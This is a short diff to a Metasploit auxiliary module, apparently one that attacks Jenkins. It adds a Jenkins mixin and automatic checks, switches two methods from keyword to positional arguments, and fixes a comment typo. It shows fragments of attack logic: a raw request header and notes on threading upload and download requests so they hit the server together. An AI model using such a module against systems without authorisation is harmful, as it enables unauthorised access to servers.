@@ -6,6 +6,8 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::Jenkins
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -128,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
     "\x03\x00\x00\x01\x31\x00\x00\x00"
   end
 
-  def data_generator(pad: false)
+  def data_generator(pad =  false)
     data = []
     data << request_header
     data << parameter_one if pad
@@ -141,7 +143,7 @@ class MetasploitModule < Msf::Auxiliary
     data.join('')
   end
 
-  def upload_request(uuid, multi_line_file: true)
+  def upload_request(uuid, multi_line_file = true)
     # send upload request asking for file
 
     # In testing against Docker image on localhost, .01 seems to be the magic to get the download request to hit very slightly ahead of the upload request
@@ -231,7 +233,7 @@ class MetasploitModule < Msf::Auxiliary
     # Looking over the python PoCs, they all include threading however
     # the writeup, and PoCs don't mention a timing component.
     # However, during testing it was found that the two requests need to
-    # his the server nearly simultaneously, with the 'download' one hitting
+    # hit the server nearly simultaneously, with the 'download' one hitting
     # first. During testing, even a .1 second slowdown was too much and
     # the server resulted in a 500 error. So we need to thread these to
     # execute them fast enough that the server gets both in rapid succession
